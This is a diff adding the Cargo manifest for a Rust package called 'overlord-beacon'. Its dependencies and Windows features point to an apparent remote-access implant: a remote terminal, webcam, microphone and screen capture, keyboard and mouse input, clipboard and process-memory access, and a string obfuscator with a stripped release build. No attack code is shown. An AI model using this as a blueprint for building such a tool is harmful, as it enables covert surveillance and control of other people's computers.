@@ -1,0 +1,91 @@
+[package]
+name = "overlord-beacon"
+version = "1.0.0"
+edition = "2021"
+build = "build.rs"
+publish = false
+
+[lib]
+name = "overlord_beacon"
+path = "src/lib.rs"
+
+[[bin]]
+name = "overlord-beacon"
+path = "src/main.rs"
+
+[dependencies]
+anyhow = "1"
+base64 = "0.22"
+ed25519-dalek = { version = "2.2", features = ["rand_core"] }
+futures-util = "0.3"
+rand_core = { version = "0.6", features = ["getrandom"] }
+rmp-serde = "1.3"
+rmpv = { version = "1.3", features = ["with-serde"] }
+rustls = { version = "0.23", features = ["ring"] }
+serde = { version = "1", features = ["derive"] }
+serde_bytes = "0.11"
+serde_json = "1"
+sha2 = "0.10"
+sha1 = "0.10"
+md-5 = "0.10"
+crc32fast = "1"
+tokio = { version = "1", features = ["full"] }
+tokio-util = "0.7"
+tokio-tungstenite = { version = "0.24", features = ["rustls-tls-webpki-roots"] }
+tokio-rustls = "0.26"
+webpki-roots = "0.26"
+url = "2"
+uuid = { version = "1", features = ["v4"] }
+portable-pty = "0.9"
+libjpeg-turbo-rs = "0.9"
+png = "0.17"
+image = { version = "0.25", default-features = false, features = ["jpeg", "png"] }
+zip = { version = "2", default-features = false, features = ["deflate"] }
+libloading = "0.8"
+cpal = "0.15"
+nokhwa = { version = "0.10", default-features = false, features = ["input-native"] }
+webrtc = "0.11"
+openh264 = "0.6"
+overlord-beacon-string-obfuscator = { path = "string-obfuscator" }
+
+[target.'cfg(windows)'.dependencies]
+chrono = { version = "0.4", default-features = false, features = ["clock"] }
+windows-sys = { version = "0.59", features = [
+    "Win32_Foundation",
+    "Win32_Security",
+    "Win32_Security_Authorization",
+    "Win32_Security_Cryptography",
+    "Win32_System_Threading",
+    "Win32_System_ProcessStatus",
+    "Win32_System_Diagnostics_ToolHelp",
+    "Win32_System_Diagnostics_Debug",
+    "Win32_System_LibraryLoader",
+    "Win32_System_Memory",
+    "Win32_System_Registry",
+    "Win32_System_DataExchange",
+    "Win32_System_StationsAndDesktops",
+    "Win32_System_Ole",
+    "Win32_System_Console",
+    "Win32_System_SystemInformation",
+    "Win32_System_SystemServices",
+    "Win32_System_Pipes",
+    "Win32_System_IO",
+    "Win32_System_Power",
+    "Win32_Storage_FileSystem",
+    "Win32_Storage_Xps",
+    "Win32_UI_WindowsAndMessaging",
+    "Win32_UI_Input_KeyboardAndMouse",
+    "Win32_UI_Shell",
+    "Win32_Graphics_Gdi",
+    "Win32_Graphics_Dwm",
+] }
+
+[profile.release]
+opt-level = 3
+lto = true
+codegen-units = 1
+panic = "abort"
+strip = true
+
+[build-dependencies]
+serde_json = "1"
